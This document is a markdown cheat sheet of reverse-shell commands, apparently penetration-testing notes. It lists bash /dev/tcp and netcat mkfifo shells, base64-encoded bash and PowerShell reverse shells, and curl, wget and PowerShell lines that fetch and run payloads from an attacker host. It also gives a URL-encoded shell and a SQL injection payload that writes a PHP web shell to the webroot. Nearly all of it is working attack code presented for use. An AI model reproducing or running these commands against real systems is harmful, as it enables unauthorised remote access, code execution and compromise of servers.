# Reverse Shell Execution Methodology

### 1) Resources to generate reverse shells:

1) https://www.revshells.com/

2) https://addons.mozilla.org/en-US/firefox/addon/hacktools/

### 2) Most chosen reverse shells to execute

#### Linux

Bash TCP reverse shell

    /bin/bash -i >& /dev/tcp/192.168.45.221/80 0>&1

nc mkfifo shell

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.221 80 >/tmp/f

Base64 encoded shell

    base64 revshell.sh
    echo "BASE64_SHELL" |base64 -d | bash
    bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIzNy84MCAwPiYx}|{base64,-d}|{bash,-i}

Curl shell from remote server

    curl http://ATTACK_IP/shell.sh | bash

Manual execution

    wget http://ATTACK_IP/shell.sh -o /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh

#### Windows

In-Memory PowerShell execution

    powershell -c "iex (New-Object Net.WebClient).DownloadString('http://192.168.45.177/meterpreter.ps1')"

Base64 encoded powershell

    powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgAxACIALAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA

Netcat (wget)

    wget http://ATTACK_IP/nc.exe -o C:\temp\nc.exe
    C:\temp\nc.exe ATTACK_IP PORT -e cmd

Netcat (curl)

    curl http://ATTACK_IP/nc.exe -o C:\temp\nc.exe
    C:\temp\nc.exe ATTACK_IP PORT -e cmd

### 3) Tips and tricks

Encoding tool: https://gchq.github.io/CyberChef/

If interacting with an HTTP request to try to execute a reverse shell, always URL encode (characters too) for the browser to interpret your input properly

mkfifo shell

    %20rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20%2Di%202%3E%261%7Cnc%20192%2E168%2E45%2E221%2080%20%3E%2Ftmp%2Ff

SQL Injection webshell write (Webroot might vary! Try to check a phpinfo.php file if you have access to determine the webroot of the server)

Original:

    ' UNION SELECT '<?php echo system($_REQUEST["cmd"]);?>'INTO OUTFILE '/var/www/html/webshell.php' -- -

Encoded:

    %27%20UNION%20SELECT%20%27%3C%3Fphp%20echo%20system%28%24%5FREQUEST%5B%22cmd%22%5D%29%3B%3F%3E%27INTO%20OUTFILE%20%27%2Fvar%2Fwww%2Fhtml%2Fwebshell%2Ephp%27%20%2D%2D%20%2D


